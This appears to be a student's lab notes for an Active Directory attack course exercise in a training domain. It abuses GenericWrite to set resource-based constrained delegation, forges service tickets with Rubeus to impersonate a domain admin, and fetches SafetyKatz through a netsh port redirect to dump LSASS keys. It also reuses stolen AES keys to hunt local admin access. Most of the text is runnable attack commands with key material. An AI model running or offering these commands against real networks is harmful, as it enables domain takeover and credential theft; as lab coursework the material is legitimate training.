
Task 
• Find a computer object in US domain where we have Write permissions. 
• Abuse the Write permissions to access that computer as Domain Admin. 
• Extract secrets from that machine for users and hunt for local admin privileges for the users.


Powerview

```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin'}
```

![[Pasted image 20250318214520.png]]

Sweet! With GenericWrite on us-helpdesk. We can set Resource-based Constrained Delegation for ushelpdesk for our own student VM. We are using our student VM computer object and not the studentuserx as SPN is required for RBCD. 

Start a process with privileges of mgtmadmin. Use ArgSplit.bat on the student VM to encode “asktgt” Run the below command from an elevated shell:

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:mgmtadmin /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

In the new process, set RBCD for student VMs to us-helpdesk using the Active Directory module. Note that we are setting RBCD for the entire student VMs in the current instance of lab to avoid overwriting the settings:

Active Module

```
$comps = 'student139$'
```


```
Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps -Verbose
```

Now, we need AES key for the student VM to use its identity. Run mimikatz on your own studentx machine to extract AES keys. Start a command prompt with administrative privileges (Run as administrator) and run the below command. Note that you will get different AES keys for the studentx$ account, go for the one with SID S-1-5-18 that is a well-known SID for the SYSTEM user:

```
echo %Pwn% sekurlsa::ekeys
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe - args "%Pwn%" "exit"
```

![[Pasted image 20250318222544.png]]

```
echo %Pwn% s4u
```

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:STUDENT139$ /aes256:62918869f04568f584a2ada4b6a0c8e2ec90f86efe7472378ccc2e1c0180196c /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
```


![[Pasted image 20250318222702.png]]

Use the AES key for studentx$ with Rubeus and request a TGS for HTTP SPN:

Let's use the HTTP TGS to access us-helpdesk as DA – administrator. Run the below command in the process where we injected the TGS above:

![[Pasted image 20250318222846.png]]

Now, to copy our loader to us-helpdesk, we need to access the filesystem. Let's request a TGS for CIFS using Rubeus in the same process as above:


```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:student139$ /aes256:62918869f04568f584a2ada4b6a0c8e2ec90f86efe7472378ccc2e1c0180196c /msdsspn:cifs/us-helpdesk /impersonateuser:administrator /ptt
```

Now, copy the Netloader, add port redirection and run SafetyKatz on us-helpdesk to extract credentials from lsass:

```
echo F | xcopy C:\AD\Tools\Loader.exe \\us-helpdesk\C$\Users\Public\Loader.exe /Y
```

![[Pasted image 20250318223841.png]]

```
winrs -r:us-helpdesk cmd
```

```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.139
```


```
echo %Pwn% sekurlsa::ekeys
```

```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args %Pwn% "exit"
```

![[Screenshot from 2025-03-18 23-07-07.png]]


Reuse the AES keys of helpdeskadmin and use Find-PSRemotingLocalAdminAccess for hunting local admin privileges. Run the OverPass-the-hash command using Rubeus from an elevated shell:

```
echo %Pwn% asktgt
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe - args %Pwn% /user:helpdeskadmin /aes256:f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```


In the new process:

```
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

```
Find-PSRemotingLocalAdminAccess -Domain us.techcorp.local -Verbose
```


![[Pasted image 20250318231217.png]]

So, helpdeskadmin has administrative privileges on us-adconnect too!

